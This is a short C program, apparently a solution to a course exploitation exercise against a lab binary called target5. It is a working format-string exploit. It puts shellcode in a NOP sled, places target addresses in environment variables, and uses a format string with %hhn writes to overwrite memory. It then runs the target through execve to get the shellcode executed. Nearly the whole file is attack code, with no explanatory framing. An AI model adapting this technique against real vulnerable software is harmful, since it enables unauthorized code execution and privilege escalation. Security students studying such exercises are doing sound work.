#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target5"
#define BUFF_SIZE 200
#define NOP 0x90

int main(void)
{
	char buff[] = "\x68\xfe\x2d\x20"; // first address, put in argument buffer for memory alignment

	// copy shell code
	char shell[BUFF_SIZE];
	memset(shell, NOP, BUFF_SIZE);
	int offset = (BUFF_SIZE - sizeof(shellcode)) / 2;
	memcpy(&shell[offset], &shellcode, sizeof(shellcode) - 1);

	shell[BUFF_SIZE - 1] = '\0';


	char *args[3];
	char *env[21];

	args[0] = TARGET; args[1] = buff; args[2] = NULL;

	
	env[0] = "\0";
	env[1] = "\0";
	env[2] = "\0";
	env[3] = "AAAAAAA";
	env[4] = "\x69\xfe\x2d\x20";
	env[5] = "\0";
	env[6] = "\0";
	env[7] = "\0";
	env[8] = "BBBBBBB";
	env[9] = "\x6a\xfe\x2d\x20";
	env[10] = "\0";
	env[11] = "\0";
	env[12] = "\0";
	env[13] = "CCCCCCC";
	env[14] = "\x6b\xfe\x2d\x20";
	env[15] = "\0";
	env[16] = "\0";
	env[17] = "\0";
	env[18] = "0000%x%x%x%x%.198u|%hhn|%.23u|%hhn|%.50u|%hhn|%.241u|%hhn|";
	env[19] = shell;
	env[20] = NULL;

	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}
